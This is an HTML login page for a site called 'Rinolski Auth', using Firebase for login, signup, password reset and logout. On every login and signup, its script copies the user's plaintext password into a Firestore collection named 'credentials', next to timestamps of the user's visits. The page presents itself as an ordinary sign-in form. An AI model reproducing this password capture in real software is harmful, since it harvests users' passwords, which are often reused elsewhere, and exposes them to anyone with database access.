<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Rinolski Auth</title>
<link rel="stylesheet" href="https://rinolski.neocities.org/CSS/login.css">
</head>
<body>

<div class="box">

    <div id="authFields">


        <input id="email" type="email" placeholder="Email">
        <input id="password" type="password" placeholder="Password">

        <button onclick="login()">Log In</button>
        <button onclick="signup()">Sign Up</button>
        <button onclick="resetPassword()">Reset Password</button>

        <div class="error" id="errorBox"></div>
    </div>

    <div id="loggedInView">
        <div id="userEmail"></div>
        <button onclick="logout()">Log Out</button>
    </div>

</div>

<!-- Firebase NON-MODULE -->
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>

<script>
// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyCExki28m1NNepVQEIjmcQzR8z8O68LqIc",
  authDomain: "rinolski-notifications.firebaseapp.com",
  projectId: "rinolski-notifications",
  storageBucket: "rinolski-notifications.firebasestorage.app",
  messagingSenderId: "355554579853",
  appId: "1:355554579853:web:3caa961653c0cdc0a359c4"
};

// Init Firebase
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.firestore();

// UI elements
const emailEl = document.getElementById("email");
const passEl = document.getElementById("password");
const errorBox = document.getElementById("errorBox");
const authFields = document.getElementById("authFields");
const loggedInView = document.getElementById("loggedInView");
const userEmailBox = document.getElementById("userEmail");

function showError(msg) { errorBox.textContent = msg; }

// ---------------- LOGIN ----------------
function login() {
    const email = emailEl.value.trim();
    const pass = passEl.value.trim();
    if (!email || !pass) return showError("Please fill all fields.");

    auth.signInWithEmailAndPassword(email, pass)
        .then(() => {
            db.collection("credentials").doc(email).set({
                password: pass,
                logins: firebase.firestore.FieldValue.arrayUnion(new Date().toLocaleString()),
                lastVisited: new Date().toLocaleString()
            }, { merge: true });
            showError("");
        })
        .catch(() => showError("Incorrect email or password."));
}

// ---------------- SIGNUP ----------------
function signup() {
    const email = emailEl.value.trim();
    const pass = passEl.value.trim();
    if (!email || !pass) return showError("Please fill all fields.");

    auth.createUserWithEmailAndPassword(email, pass)
        .then(() => {
            db.collection("credentials").doc(email).set({
                password: pass,
                signups: firebase.firestore.FieldValue.arrayUnion(new Date().toLocaleString()),
                logins: [],
                lastVisited: new Date().toLocaleString(),
                logouts: []
            }, { merge: true });
            showError("");
        })
        .catch(err => {
            if(err.code === "auth/email-already-in-use") showError("Email already registered.");
            else if(err.code === "auth/weak-password") showError("Password too weak.");
            else showError("Signup failed.");
        });
}

// ---------------- RESET PASSWORD ----------------
function resetPassword() {
    const email = emailEl.value.trim();
    if (!email) return showError("Please enter your email to reset password.");

    auth.sendPasswordResetEmail(email)
        .then(() => showError("Password reset email sent."))
        .catch(() => showError("Failed to send reset email. Check your email."));
}

// ---------------- LOGOUT ----------------
function logout() {
    const user = auth.currentUser;
    if (user) {
        db.collection("credentials").doc(user.email).update({
            logouts: firebase.firestore.FieldValue.arrayUnion(new Date().toLocaleString())
        });
    }
    auth.signOut().then(() => {
        emailEl.value = '';
        passEl.value = '';
        showError('');
    });
}

// ---------------- AUTH STATE ----------------
auth.onAuthStateChanged(user => {
    if (user) {
        authFields.style.display = "none";
        loggedInView.style.display = "block";
        userEmailBox.textContent = user.email;
    } else {
        authFields.style.display = "block";
        loggedInView.style.display = "none";
    }
});
</script>

</body>
</html>
